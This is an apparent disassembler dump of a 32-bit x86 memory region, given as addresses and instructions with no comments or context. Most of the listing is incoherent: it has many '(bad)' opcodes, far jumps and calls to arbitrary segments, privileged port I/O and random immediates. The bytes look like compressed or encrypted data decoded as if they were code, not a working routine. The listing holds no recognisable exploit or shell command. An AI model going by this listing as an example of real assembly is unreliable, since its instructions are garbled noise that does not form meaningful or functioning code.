  4293df:	inc    ebx
  4293e0:	adc    cl,ah
  4293e2:	mov    bh,0xe4
  4293e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4293e5:	pop    ecx
  4293e6:	aaa    
  4293e7:	and    DWORD PTR [edi-0x52],esp
  4293ea:	daa    
  4293eb:	ins    BYTE PTR es:[edi],dx
  4293ec:	pop    edx
  4293ed:	adc    BYTE PTR [esi+0x47cb0fc8],dh
  4293f3:	jle    0x429381
  4293f5:	fidivr DWORD PTR [ebx+ebp*8+0x2]
  4293f9:	loopne 0x429417
  4293fb:	int    0xd0
  4293fd:	in     eax,0x41
  4293ff:	pop    ecx
  429400:	inc    ebp
  429401:	push   esi
  429402:	jnp    0x4293ea
  429404:	dec    ebp
  429405:	mov    bh,0x0
  429407:	push   ss
  429408:	jbe    0x42940d
  42940a:	cmp    BYTE PTR [esi],0x6a
  42940d:	inc    eax
  42940e:	pop    esp
  42940f:	sub    WORD PTR [eax+ebx*8+0x7c],si
  429414:	sti    
  429415:	push   ecx
  429416:	popf   
  429417:	push   0xac6812ce
  42941c:	push   esi
  42941d:	rcr    BYTE PTR [edx+0x22aeb2d8],0x71
  429424:	sub    DWORD PTR [esi-0x57],ebp
  429427:	mov    al,ds:0xe6aafb79
  42942c:	mov    DWORD PTR [ebx],edi
  42942e:	sub    edx,DWORD PTR [ebx]
  429430:	scas   al,BYTE PTR es:[edi]
  429431:	adc    al,0x9e
  429433:	retf   0x5a
	...
  429496:	dec    esp
  429497:	or     eax,0x3e532c13
  42949c:	jg     0x42950b
  42949e:	adc    al,0xa9
  4294a0:	outs   dx,DWORD PTR ds:[esi]
  4294a1:	xlat   BYTE PTR ds:[ebx]
  4294a2:	jp     0x42943e
  4294a4:	(bad)  
  4294a5:	arpl   WORD PTR [ecx],bp
  4294a7:	mov    ecx,0x1070001
  4294ac:	add    BYTE PTR [eax],al
  4294ae:	xchg   ebp,eax
  4294af:	jg     0x42948c
  4294b1:	or     BYTE PTR [edx+0x10],ah
  4294b4:	js     0x4294e1
  4294b6:	stos   BYTE PTR es:[edi],al
  4294b7:	mov    eax,0x35ae8504
  4294bc:	xchg   DWORD PTR [edi],ecx
  4294be:	push   DWORD PTR [edx]
  4294c0:	dec    eax
  4294c1:	or     dh,ch
  4294c3:	imul   ebp,DWORD PTR [ebx-0x2e],0x74
  4294c7:	pop    ds
  4294c8:	inc    edx
  4294c9:	cld    
  4294ca:	int3   
  4294cb:	xchg   BYTE PTR [ebx+0x77],dh
  4294ce:	test   eax,0xaabc88cb
  4294d3:	xchg   esi,eax
  4294d4:	jecxz  0x42947e
  4294d6:	popf   
  4294d7:	pop    edx
  4294d8:	pop    ecx
  4294d9:	sbb    eax,0x50e78fe9
  4294de:	sbb    ecx,DWORD PTR [eax+esi*8]
  4294e1:	mov    esp,0x61ac32eb
  4294e6:	inc    ebp
  4294e7:	(bad)  
  4294e9:	leave  
  4294ea:	shl    DWORD PTR ds:0xdd684acb,1
  4294f0:	jle    0x4294e8
  4294f2:	shr    BYTE PTR [edx+0x5b],1
  4294f5:	lea    esi,[ecx-0x33]
  4294f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4294f9:	cdq    
  4294fa:	inc    edx
  4294fb:	sub    al,cl
  4294fd:	and    BYTE PTR [edi+0x10067c6],al
  429503:	and    esp,esp
  429505:	inc    ebp
  429506:	test   DWORD PTR [esi],esi
  429508:	scas   al,BYTE PTR es:[edi]
  429509:	jmp    0x4294c6
  42950b:	out    0x5d,eax
  42950d:	addr16 (bad) 
  42950f:	out    dx,al
  429510:	pause  
  429512:	push   ss
  429513:	add    al,0x28
  429515:	xor    bl,dh
  429517:	mov    ds:0x9b905d66,eax
  42951c:	(bad)  
  42951e:	inc    eax
  42951f:	and    BYTE PTR [edi],0x70
  429522:	repnz out dx,eax
  429524:	dec    ebp
  429525:	cdq    
  429526:	push   ebx
  429527:	fsub   DWORD PTR [ebx]
  429529:	test   ebx,esp
  42952b:	or     al,0x61
  42952d:	pop    ds
  42952e:	ins    DWORD PTR es:[edi],dx
  42952f:	loopne 0x4294ee
  429531:	mov    esi,?
  429533:	add    DWORD PTR [esi],edi
  429535:	sbb    ecx,esi
  429537:	inc    eax
  429538:	mov    bh,0xe2
  42953a:	or     BYTE PTR [ebp+0x3b],bl
  42953d:	sub    ecx,ebp
  42953f:	sub    DWORD PTR [ebx-0x58e1a0c5],edx
  429545:	cwde   
  429546:	fbld   TBYTE PTR [eax-0x75fdb8b2]
  42954c:	sub    dh,ch
  42954e:	in     eax,dx
  42954f:	sti    
  429550:	sub    DWORD PTR [eax+0x3fd1c34b],ecx
  429556:	adc    BYTE PTR [ebp+0x577c982e],0x92
  42955d:	jnp    0x42956d
  42955f:	cmp    dh,BYTE PTR [ecx+ecx*8+0x5d]
  429563:	push   ds
  429564:	add    DWORD PTR [eax+0x3de89d33],esp
  42956a:	or     bh,bh
  42956c:	loop   0x42954d
  42956e:	xchg   ecx,eax
  42956f:	cmc    
  429570:	xchg   ebp,eax
  429571:	mov    DWORD PTR ds:0x61b10f6f,eax
  429577:	into   
  429578:	hlt    
  429579:	pusha  
  42957a:	rcl    BYTE PTR [ecx-0x77],cl
  42957d:	mov    DWORD PTR [eax],eax
  42957f:	push   ss
  429580:	adc    BYTE PTR [ecx-0x6a],dh
  429583:	mov    ds:0xa770bb2c,eax
  429588:	mov    ds:0x66c918d1,al
  42958d:	sbb    al,0x5a
  42958f:	or     eax,0x18cb410d
  429594:	sub    BYTE PTR [ebx+0x4],ah
  429597:	and    dl,bh
  429599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42959a:	pusha  
  42959b:	repz dec ebp
  42959d:	cs hlt 
  42959f:	and    BYTE PTR [edi-0xd],dh
  4295a2:	cdq    
  4295a3:	dec    edi
  4295a4:	mov    dh,0xfd
  4295a6:	sub    al,BYTE PTR [edi-0x79f9056]
  4295ac:	mov    cl,0xe3
  4295ae:	cli    
  4295af:	inc    ebp
  4295b0:	call   0x0:0x7103d738
	...
  429613:	add    BYTE PTR [eax],al
  429615:	add    BYTE PTR [ebp+0x1d],ch
  429618:	out    0xc0,al
  42961a:	idiv   bl
  42961c:	outs   dx,DWORD PTR ds:[esi]
  42961d:	mov    ebp,0x8523ba9d
  429622:	push   edi
  429623:	and    ah,BYTE PTR [edx]
  429625:	jmp    0x107:0x1ba30
  42962c:	add    BYTE PTR [eax],al
  42962e:	mov    eax,0x4b5e4c7d
  429633:	test   DWORD PTR [ebp+ebx*8+0x639cf7ff],ebp
  42963a:	ret    0x8cf3
  42963d:	or     eax,0x312db514
  429642:	jmp    0x9c43:0x6f07f862
  429649:	cmp    ah,BYTE PTR [edx+esi*4-0xcf14d66]
  429650:	scas   al,BYTE PTR es:[edi]
  429651:	or     BYTE PTR [esi-0x1224ffd3],cl
  429657:	xchg   DWORD PTR [ecx],edi
  429659:	mov    edx,0x1427341
  42965e:	das    
  42965f:	ss daa 
  429661:	adc    eax,0xae2dcf74
  429666:	pop    ebp
  429667:	dec    eax
  429668:	(bad)  
  429669:	cmp    al,0x52
  42966b:	jmp    0xff87:0xe2f30749
  429672:	push   ecx
  429673:	cmp    DWORD PTR [esi+0x4b53a2a],0x7e
  42967a:	inc    ebx
  42967b:	lahf   
  42967c:	cmp    edi,edi
  42967e:	jl     0x429679
  429680:	adc    eax,DWORD PTR [edx+0x7a0d1c3]
  429686:	fsubr  DWORD PTR [esp+edi*2-0x25]
  42968a:	sbb    BYTE PTR [ebx],al
  42968c:	and    eax,0x1ec04e46
  429691:	in     al,dx
  429692:	mov    esi,0xe5ac7526
  429697:	aaa    
  429698:	dec    ecx
  429699:	mov    ds:0x26d62c3,eax
  42969e:	adc    bh,ah
  4296a0:	fnsave [ebp-0x1a41654d]
  4296a6:	jno    0x42966d
  4296a8:	cld    
  4296a9:	mov    dh,0x9b
  4296ab:	sub    DWORD PTR [edi+esi*1],esp
  4296ae:	sbb    esi,esp
  4296b0:	call   0x73c4:0x8816b08b
  4296b7:	ss gs mov ch,0x4a
  4296bb:	mov    esi,0x7030103b
  4296c0:	clc    
  4296c1:	jno    0x429684
  4296c3:	jo     0x42969f
  4296c5:	int    0x1b
  4296c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4296c8:	repnz cmp eax,0xd7df2440
  4296ce:	nop
  4296cf:	and    edi,ebx
  4296d1:	cdq    
  4296d2:	sbb    eax,0x3a869bec
  4296d7:	xchg   edx,eax
  4296d8:	cmp    al,0xad
  4296da:	imul   eax,DWORD PTR [esi+ebp*1+0x40],0x63
  4296df:	mov    eax,0xab1b5549
  4296e4:	(bad)  
  4296e6:	and    WORD PTR [esi-0x471e690e],dx
  4296ed:	aam    0x40
  4296ef:	pop    edx
  4296f0:	and    ch,BYTE PTR [edx+esi*2]
  4296f3:	mov    bh,0xa8
  4296f5:	push   ss
  4296f6:	mov    ch,0xd7
  4296f8:	pusha  
  4296f9:	push   es
  4296fa:	mov    ds:0x45bf47e9,al
  4296ff:	push   0xffffff88
  429701:	jno    0x4296ee
  429703:	pop    edx
  429704:	add    al,0x86
  429706:	add    BYTE PTR [ebx+0x31],ch
  429709:	adc    al,0xb9
  42970b:	sbb    DWORD PTR [esi],ecx
  42970d:	pop    ss
  42970e:	adc    DWORD PTR [ebp+0x1c],esp
  429711:	dec    ebx
  429712:	ds enter 0x4603,0xde
  429717:	dec    ecx
  429718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429719:	stc    
  42971a:	cld    
  42971b:	sar    DWORD PTR [ecx+0x7771a99a],cl
  429721:	pop    esi
  429722:	add    al,0x0
  429724:	popa   
  429725:	push   ebx
  429726:	icebp  
  429727:	xchg   ebx,eax
  429728:	hlt    
  429729:	cmp    dh,BYTE PTR [esi+eiz*8-0x62dbf66b]
  429730:	jnp    0x4296d0
  429732:	dec    esi
  429733:	pop    edi
  429734:	jle    0x429736
	...
  429796:	xor    BYTE PTR [edx-0x21],al
  429799:	(bad)  
  42979a:	(bad)  
  42979b:	(bad)  
  42979c:	mov    ebp,0x1396252
  4297a1:	(bad)  
  4297a3:	out    0x0,al
  4297a5:	fbstp  TBYTE PTR [edi]
  4297a7:	mov    ebx,0x1070001
  4297ac:	add    BYTE PTR [eax],al
  4297ae:	and    al,0x7c
  4297b0:	call   0x2e32:0xaafef17e
  4297b7:	retf   
  4297b8:	mov    dh,0xeb
  4297ba:	adc    al,0xf0
  4297bc:	xchg   ecx,eax
  4297bd:	push   ebp
  4297be:	call   0x15bc4c94
  4297c3:	jle    0x4297ec
  4297c5:	jb     0x429836
  4297c7:	sar    BYTE PTR [ebx-0x4255001],cl
  4297cd:	mov    eax,0x21a5967c
  4297d2:	test   DWORD PTR [esi-0x3afab307],0x8010509f
  4297dc:	pusha  
  4297dd:	inc    edx
  4297de:	addr16 gs aad 0x73
  4297e2:	pop    ebx
  4297e3:	test   DWORD PTR [edx-0x64],esi
  4297e6:	pusha  
  4297e7:	mov    ah,0x14
  4297e9:	iret   
  4297ea:	inc    ebx
  4297eb:	inc    BYTE PTR [ebp-0x29f50a6e]
  4297f1:	xor    eax,0xe3253246
  4297f6:	dec    esi
  4297f7:	push   edi
  4297f8:	and    BYTE PTR [ebp-0x7ed0f6f5],dh
  4297fe:	fnstsw WORD PTR [ebp-0x230708d2]
  429804:	dec    edx
  429805:	stc    
  429806:	rcl    DWORD PTR [esi+0x33a06f64],cl
  42980c:	repz scas eax,DWORD PTR es:[edi]
  42980e:	push   edi
  42980f:	jbe    0x4297b2
  429811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429812:	leave  
  429813:	mov    ds,WORD PTR [ecx-0x21]
  429816:	inc    ebp
  429817:	and    DWORD PTR ds:0xd6756806,0x34
  42981e:	xor    cl,BYTE PTR [esp+ecx*8]
  429821:	jne    0x42982f
  429823:	dec    edi
  429824:	mov    DWORD PTR [esi],edx
  429826:	shr    BYTE PTR [eax],cl
  429828:	clc    
  429829:	mov    esp,0x37721478
  42982e:	or     eax,DWORD PTR [ebx]
  429830:	pop    esp
  429831:	leave  
  429832:	dec    ebx
  429833:	scas   eax,DWORD PTR es:[edi]
  429834:	pop    ecx
  429835:	sub    DWORD PTR [eax-0x74],esi
  429838:	sahf   
  429839:	sar    ebx,1
  42983b:	sar    DWORD PTR [eax+ecx*4-0x55],cl
  42983f:	push   0xfd80c144
  429844:	cmp    DWORD PTR [ebx],esi
  429846:	jmp    0x654e8dce
  42984b:	mov    ah,0xcc
  42984d:	dec    ecx
  42984e:	xchg   edx,eax
  42984f:	xor    dh,bl
  429851:	rol    DWORD PTR [edx+0x355e9cea],0xd1
  429858:	xlat   BYTE PTR ds:[ebx]
  429859:	sub    DWORD PTR [ebx],0xe
  42985c:	xor    eax,0xfda5feec
  429861:	out    dx,al
  429862:	loopne 0x42980f
  429864:	ja     0x4298e5
  429866:	jl     0x429890
  429868:	jae    0x429858
  42986a:	ja     0x429807
  42986c:	pop    es
  42986d:	leave  
  42986e:	aaa    
  42986f:	push   ss
  429870:	(bad)  
  429871:	das    
  429872:	inc    ebx
  429873:	adc    al,0x83
  429875:	add    BYTE PTR ds:0x360be69c,al
  42987b:	xor    BYTE PTR ds:0x67d93865,ah
  429881:	test   eax,0x9e1672ea
  429886:	dec    edx
  429887:	sbb    dh,BYTE PTR [ecx]
  429889:	mov    bl,0x63
  42988b:	push   cs
  42988c:	in     al,0xda
  42988e:	push   0x7393d06c
  429893:	xor    eax,0xcd6b9ba1
  429898:	sbb    ebp,ebx
  42989a:	out    dx,al
  42989b:	or     eax,0x3cc7fcc5
  4298a0:	sbb    bh,BYTE PTR [ecx+0x6]
  4298a3:	fdivr  st(3),st
  4298a5:	pop    ecx
  4298a6:	dec    ecx
  4298a7:	and    bh,BYTE PTR [esi-0x39]
  4298aa:	div    DWORD PTR [ebp+0x54fbafb4]
  4298b0:	push   es
  4298b1:	jl     0x42989b
  4298b3:	pop    ebx
  4298b4:	xor    eax,DWORD PTR [eax]
	...
  429916:	push   edi
  429917:	push   0xdf7fdf64
  42991c:	(bad)  
  42991d:	call   0x449747d3
  429922:	gs dec eax
  429924:	(bad)  
  429925:	out    0x3e,eax
  429927:	mov    esp,0x1070001
  42992c:	add    BYTE PTR [eax],al
  42992e:	shl    ebp,0x22
  429931:	jmp    0xfee18a2d
  429936:	jl     0x429962
  429938:	cdq    
  429939:	ins    DWORD PTR es:[edi],dx
  42993a:	cli    
  42993b:	fnstenv ds:[eax-0x5f]
  42993f:	or     cl,BYTE PTR [edi-0xbffdc60]
  429945:	sbb    al,0xbe
  429947:	jmp    ebx
  429949:	jns    0x42998d
  42994b:	push   esi
  42994c:	cli    
  42994d:	inc    ebx
  42994e:	fisub  WORD PTR [ebp+0x11]
  429951:	sub    edx,DWORD PTR [eax]
  429953:	outs   dx,DWORD PTR ds:[esi]
  429954:	push   0x5b667354
  429959:	fs test eax,0x9c22f88f
  42995f:	in     eax,0xfa
  429961:	pop    ds
  429962:	stc    
  429963:	hlt    
  429964:	fsub   DWORD PTR [eax+0x344d814a]
  42996a:	aas    
  42996b:	sahf   
  42996c:	sub    al,0x6c
  42996e:	addr16 test eax,0xe33a303b
  429974:	enter  0xdcfc,0xf1
  429978:	into   
  429979:	retf   
  42997a:	nop
  42997b:	retf   
  42997c:	ds jno 0x4299eb
  42997f:	jl     0x429994
  429981:	or     al,BYTE PTR [ebx-0x12]
  429984:	sbb    DWORD PTR [esp+eax*1],ebp
  429987:	dec    esi
  429988:	add    BYTE PTR [ecx+eiz*4-0x2be82576],bh
  42998f:	sbb    eax,0x4cd4c2aa
  429994:	pop    edx
  429995:	gs mov esp,0x69da48d7
  42999b:	test   cl,cl
  42999d:	xchg   ebp,eax
  42999e:	mov    ebp,0x117e0e56
  4299a3:	xor    eax,0xacc98cd7
  4299a8:	out    0xd4,eax
  4299aa:	ret    
  4299ab:	cmp    bh,bh
  4299ad:	mov    ecx,0x84b56102
  4299b2:	xor    esp,DWORD PTR [ebx]
  4299b4:	pop    ebx
  4299b5:	enter  0x1231,0xc7
  4299b9:	scas   eax,DWORD PTR es:[edi]
  4299ba:	out    dx,eax
  4299bb:	cs dec ebp
  4299bd:	sub    esi,DWORD PTR [eax]
  4299bf:	pop    ebp
  4299c0:	in     eax,dx
  4299c1:	jecxz  0x429a27
  4299c3:	dec    ebx
  4299c4:	les    esi,FWORD PTR [esi]
  4299c6:	pop    ds
  4299c7:	cmp    DWORD PTR [esi],edx
  4299c9:	fdiv   DWORD PTR [ecx-0x42]
  4299cc:	les    ebp,FWORD PTR [edx+0x30]
  4299cf:	jle    0x429a39
  4299d1:	enter  0x1bf0,0xa4
  4299d5:	out    0x1d,al
  4299d7:	loope  0x4299f1
  4299d9:	jmp    0x429a53
  4299db:	shl    cl,1
  4299dd:	push   ebp
  4299de:	imul   edx,DWORD PTR [edx-0x50],0x26424a25
  4299e5:	jns    0x429a4f
  4299e7:	inc    eax
  4299e8:	lods   al,BYTE PTR ds:[esi]
  4299e9:	ret    
  4299ea:	scas   al,BYTE PTR es:[edi]
  4299eb:	les    edx,FWORD PTR [esi]
  4299ed:	pop    ebp
  4299ee:	(bad)  
  4299ef:	xchg   esi,eax
  4299f0:	sti    
  4299f1:	pop    edi
  4299f2:	int    0x9b
  4299f4:	push   0x9f16e82
  4299f9:	pushf  
  4299fa:	jnp    0x429a1e
  4299fc:	dec    ecx
  4299fd:	dec    eax
  4299fe:	(bad)  
  4299ff:	adc    eax,0x12871037
  429a04:	mov    al,ds:0x54419f9b
  429a09:	mov    dl,BYTE PTR [esi-0x2429c832]
  429a0f:	push   cs
  429a10:	fisttp DWORD PTR [eax+eax*1]
  429a13:	es test al,0xd8
  429a16:	aaa    
  429a17:	rcl    bl,0xe5
  429a1a:	cdq    
  429a1b:	push   ebx
  429a1c:	fdiv   DWORD PTR [ebx+0x19]
  429a1f:	sbb    DWORD PTR [ebx+0x1a6578bb],esi
  429a25:	mov    ch,0xa0
  429a27:	in     al,0x4a
  429a29:	stos   BYTE PTR es:[edi],al
  429a2a:	idiv   BYTE PTR [esi+0x35689630]
  429a30:	inc    esp
  429a31:	sbb    DWORD PTR [edx+0x3726],esi
	...
  429a93:	add    BYTE PTR [eax],al
  429a95:	add    dh,cl
  429a97:	std    
  429a98:	sti    
  429a99:	leave  
  429a9a:	sti    
  429a9b:	iret   
  429a9c:	(bad)  
  429a9d:	jmp    DWORD PTR [ecx]
  429a9f:	dec    eax
  429aa0:	mov    edi,0xcadf6513
  429aa5:	retf   0xbd45
  429aa8:	add    DWORD PTR [eax],eax
  429aaa:	pop    es
  429aab:	add    DWORD PTR [eax],eax
  429aad:	add    BYTE PTR [ecx-0x5d],dh
  429ab0:	jmp    0x429ab3
  429ab2:	fldl2t 
  429ab4:	lahf   
  429ab5:	shl    DWORD PTR [eax-0x22],0x19
  429ab9:	cmp    al,0x22
  429abb:	mov    ds:0xd94f3b2f,eax
  429ac0:	test   DWORD PTR [esi+eax*8],esp
  429ac3:	ror    BYTE PTR [ebp+0x1d],cl
  429ac6:	popf   
  429ac7:	xor    DWORD PTR [ebx-0x197d8453],ecx
  429acd:	xchg   DWORD PTR [ebx-0x3b],edi
  429ad0:	fs inc edx
  429ad2:	or     eax,0xd54723c0
  429ad7:	adc    al,0x11
  429ad9:	inc    eax
  429ada:	xlat   BYTE PTR ds:[ebx]
  429adb:	sub    al,0xeb
  429add:	and    bh,BYTE PTR [eax]
  429adf:	mov    ah,0xeb
  429ae1:	and    esp,edi
  429ae3:	enter  0xd8a6,0xaf
  429ae7:	bnd jns 0x429b08
  429aea:	(bad)  [edi]
  429aec:	pop    ebp
  429aed:	(bad)  
  429aee:	ins    BYTE PTR es:[edi],dx
  429aef:	inc    edx
  429af0:	and    BYTE PTR [eax-0x25],cl
  429af3:	mov    bl,0xb3
  429af5:	sbb    edx,DWORD PTR [edi+ecx*1]
  429af8:	cmp    ecx,DWORD PTR [esi]
  429afa:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  429afc:	sub    DWORD PTR [ecx-0x76e09567],edx
  429b02:	mov    ch,0x9f
  429b04:	sti    
  429b05:	xchg   edi,eax
  429b06:	jns    0x429b5b
  429b08:	fmul   DWORD PTR [esi-0x46]
  429b0b:	adc    DWORD PTR [eax-0x7],edi
  429b0e:	mov    ecx,0xb67c91fd
  429b13:	imul   ecx,DWORD PTR [edi],0xffffffa3
  429b16:	inc    ebx
  429b17:	aaa    
  429b18:	jp     0x429b6d
  429b1a:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b1c:	xchg   ecx,eax
  429b1d:	loop   0x429aea
  429b1f:	jge    0x429aae
  429b21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b22:	mov    edi,0xfa6f56ca
  429b27:	jmp    0x3a5d:0x6cbd2422
  429b2e:	rol    DWORD PTR [ecx],cl
  429b30:	adc    esp,DWORD PTR ds:0x61f6a7e3
  429b36:	xchg   esi,eax
  429b37:	jmp    0x56b4:0x381e520a
  429b3e:	ss mov bh,0xe3
  429b41:	lahf   
  429b42:	add    eax,0x4740e81a
  429b47:	adc    bh,dl
  429b49:	stos   DWORD PTR es:[edi],eax
  429b4a:	mov    eax,0x13062fcd
  429b4f:	push   0x2d
  429b51:	daa    
  429b52:	call   0x117c:0x74251b83
  429b59:	sub    BYTE PTR [eax],bh
  429b5b:	xchg   esi,eax
  429b5c:	fistp  QWORD PTR [esi+ecx*2-0x4681d9b7]
  429b63:	jmp    0xfe4ca15a
  429b68:	xchg   ebx,eax
  429b69:	and    ebp,DWORD PTR [ebx+0x5c41a708]
  429b6f:	or     DWORD PTR [ecx-0x6f4ed13],ebp
  429b75:	pop    esp
  429b76:	adc    BYTE PTR [eax],ah
  429b78:	inc    eax
  429b79:	add    BYTE PTR [edi],bl
  429b7b:	and    cl,BYTE PTR [esi-0x79]
  429b7e:	test   dh,bl
  429b80:	out    dx,al
  429b81:	and    BYTE PTR [esi+0x32],ch
  429b84:	addr16 repz fwait
  429b87:	mov    esi,0xd06779cd
  429b8c:	and    BYTE PTR [edx],cl
  429b8e:	adc    DWORD PTR [edx+0x48],ebp
  429b91:	adc    eax,DWORD PTR [ebx-0x3186db0a]
  429b97:	js     0x429bde
  429b99:	add    DWORD PTR [ebx-0x65],ebp
  429b9c:	push   ds
  429b9d:	js     0x429b52
  429b9f:	adc    dh,ah
  429ba1:	int3   
  429ba2:	sub    eax,0x6caf03d6
  429ba7:	mov    dl,0xa1
  429ba9:	les    eax,FWORD PTR [ecx+0xc]
  429bac:	xor    al,0xa8
  429bae:	adc    bh,BYTE PTR [edi+eiz*8]
  429bb1:	add    ch,BYTE PTR [esi+0x7c]
  429bb4:	push   ecx
	...
  429c15:	add    BYTE PTR [ebx-0x487759ea],ah
  429c1b:	mov    eax,0x52a3faf
  429c20:	xchg   esp,eax
  429c21:	pop    eax
  429c22:	push   ecx
  429c23:	jle    0x429c60
  429c25:	jmp    0x107:0x1be4c
  429c2c:	add    BYTE PTR [eax],al
  429c2e:	rol    BYTE PTR [edx-0x7c29b1db],0xc3
  429c35:	shr    BYTE PTR [ecx-0x6c3cf96],0x6
  429c3c:	fwait
  429c3d:	rcl    BYTE PTR [eax-0x2426a70a],cl
  429c43:	adc    BYTE PTR [ebx+0xc6a907a],0xc2
  429c4a:	jle    0x429c7e
  429c4c:	dec    ebx
  429c4d:	outs   dx,BYTE PTR ds:[esi]
  429c4e:	iret   
  429c4f:	jecxz  0x429c94
  429c51:	icebp  
  429c52:	icebp  
  429c53:	mov    cl,0xc9
  429c55:	call   0xc7d60734
  429c5a:	(bad)  
  429c5b:	clc    
  429c5c:	popa   
  429c5d:	into   
  429c5e:	shl    DWORD PTR [ebx],cl
  429c60:	xchg   esi,eax
  429c61:	sbb    al,0x46
  429c63:	aam    0x31
  429c65:	adc    DWORD PTR [ecx+0x1b796feb],edx
  429c6b:	jae    0x429c21
  429c6d:	lea    edx,ds:[eax+0x1d]
  429c71:	addr16 repz repz jae 0x429c7a
  429c76:	bound  esi,QWORD PTR [eax-0x35]
  429c79:	icebp  
  429c7a:	pop    eax
  429c7b:	aam    0x8c
  429c7d:	inc    eax
  429c7e:	mov    dl,0x10
  429c80:	push   ss
  429c81:	aaa    
  429c82:	mov    edi,0x3d32dc54
  429c87:	inc    esi
  429c88:	icebp  
  429c89:	mov    eax,0x40584459
  429c8e:	fwait
  429c8f:	add    eax,0xf985b1a1
  429c94:	(bad)  
  429c95:	popf   
  429c96:	mov    BYTE PTR [ebx+eax*2+0x1c],dl
  429c9a:	or     ecx,DWORD PTR [edi]
  429c9c:	retf   0x6d64
  429c9f:	pop    ecx
  429ca0:	retf   0x161d
  429ca3:	ror    DWORD PTR [edx],1
  429ca5:	xlat   BYTE PTR ds:[ebx]
  429ca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429ca8:	fstp   DWORD PTR [eax]
  429caa:	jbe    0x429cc4
  429cac:	fisttp WORD PTR [eax+0x0]
  429caf:	outs   dx,DWORD PTR ds:[esi]
  429cb0:	adc    ebx,ebx
  429cb2:	enter  0x6b35,0x6a
  429cb6:	mov    al,0xe1
  429cb8:	cmp    BYTE PTR [edx+0x528ca129],bl
  429cbe:	fcom   DWORD PTR [edi+0x12]
  429cc1:	pop    edi
  429cc2:	xchg   esi,eax
  429cc3:	shl    BYTE PTR [edi],cl
  429cc5:	popf   
  429cc6:	repnz leave 
  429cc8:	and    dl,BYTE PTR [eax+0x354ae2d]
  429cce:	je     0x429ce9
  429cd0:	dec    eax
  429cd1:	pusha  
  429cd2:	lods   eax,DWORD PTR ds:[esi]
  429cd3:	loop   0x429cbe
  429cd5:	inc    ecx
  429cd6:	les    ecx,FWORD PTR [ecx-0x61]
  429cd9:	pop    es
  429cda:	jg     0x429ce9
  429cdc:	adc    al,0x7e
  429cde:	icebp  
  429cdf:	add    al,0x99
  429ce1:	push   ecx
  429ce2:	jge    0x429d17
  429ce4:	cmp    bl,al
  429ce6:	xor    BYTE PTR [edi-0x5b],bl
  429ce9:	pushf  
  429cea:	and    al,0x77
  429cec:	lds    esp,FWORD PTR [edi+esi*2-0x329ba3d7]
  429cf3:	push   ebp
  429cf4:	ret    0x44db
  429cf7:	and    al,0xab
  429cf9:	sub    BYTE PTR ds:0x783cec9a,0xd7
  429d00:	nop
  429d01:	lahf   
  429d02:	cmp    ch,BYTE PTR [ecx+0x42]
  429d05:	lock push esi
  429d07:	fdivr  st,st(5)
  429d09:	xchg   esp,eax
  429d0a:	add    DWORD PTR [ebx-0x47843db7],edx
  429d10:	add    eax,0x3bfe9dae
  429d15:	sbb    DWORD PTR [edx+0xfc1f9ab],0xffffffcf
  429d1c:	mov    eax,0xb5ff08e1
  429d21:	inc    ecx
  429d22:	xchg   edi,eax
  429d23:	and    ebx,0xffffffa4
  429d26:	cmp    BYTE PTR [esi+0x155e5dc6],bl
  429d2c:	aaa    
  429d2d:	push   esi
  429d2e:	mov    eax,0x2664aa11
  429d33:	xor    eax,0xd8
	...
  429d94:	add    BYTE PTR [eax],al
  429d96:	fwait
  429d97:	mov    bh,0xc4
  429d99:	or     al,0xec
  429d9b:	jg     0x429d78
  429d9d:	mov    bh,0xb8
  429d9f:	xor    al,0xdf
  429da1:	sub    eax,0xa6b0f72d
  429da6:	push   ebx
  429da7:	mov    edi,0x1070001
  429dac:	add    BYTE PTR [eax],al
  429dae:	push   ss
  429daf:	mov    ebp,0xe90f0d2a
  429db4:	lahf   
  429db5:	and    eax,0x2938fb12
  429dba:	and    DWORD PTR [ebx-0x10],ebx
  429dbd:	mov    bl,0x9a
  429dbf:	inc    esp
  429dc0:	pop    es
  429dc1:	mov    eax,edx
  429dc3:	into   
  429dc4:	pop    ebx
  429dc5:	in     al,0xc6
  429dc7:	inc    edi
  429dc8:	mov    al,0x1a
  429dca:	sub    al,0x4d
  429dcc:	ret    0x62d1
  429dcf:	in     eax,dx
  429dd0:	adc    WORD PTR [ebp-0x6e882bec],bp
  429dd7:	sub    edx,ecx
  429dd9:	clc    
  429dda:	jg     0x429dfc
  429ddc:	int3   
  429ddd:	xchg   esi,eax
  429dde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ddf:	jge    0x429d9b
  429de1:	retf   
  429de2:	jmp    0x429e0e
  429de4:	shl    BYTE PTR [ebp-0x68d5eb59],0x58
  429deb:	push   edi
  429dec:	and    BYTE PTR [esi-0x39617511],0xbb
  429df3:	iret   
  429df4:	inc    esi
  429df5:	fwait
  429df6:	addr16 mov ecx,0x7b0e8c79
  429dfc:	and    cl,bh
  429dfe:	gs test eax,0x80fb5297
  429e04:	push   cs
  429e05:	retf   
  429e06:	sbb    eax,0x38f67397
  429e0b:	xchg   esp,eax
  429e0c:	ins    DWORD PTR es:[edi],dx
  429e0d:	into   
  429e0e:	add    ah,BYTE PTR [edi]
  429e10:	jne    0x429e5e
  429e12:	pop    esp
  429e13:	fisubr WORD PTR [esi-0x33]
  429e16:	fwait
  429e17:	push   ds
  429e18:	lods   al,BYTE PTR ds:[esi]
  429e19:	adc    DWORD PTR [edi+eiz*4+0x57fd99a],ebx
  429e20:	scas   eax,DWORD PTR es:[edi]
  429e21:	mov    bl,0xc6
  429e23:	cwde   
  429e24:	or     cl,BYTE PTR [ecx-0x48]
  429e27:	mov    ebx,0x68b2ffbb
  429e2c:	push   cs
  429e2d:	(bad)  
  429e2e:	mov    fs,eax
  429e30:	mov    eax,ds:0x2c9e1892
  429e35:	add    eax,0x28cd8fa7
  429e3a:	push   edx
  429e3b:	jmp    0x429e5a
  429e3d:	js     0x429e58
  429e3f:	adc    dh,dl
  429e41:	and    eax,0xb127050e
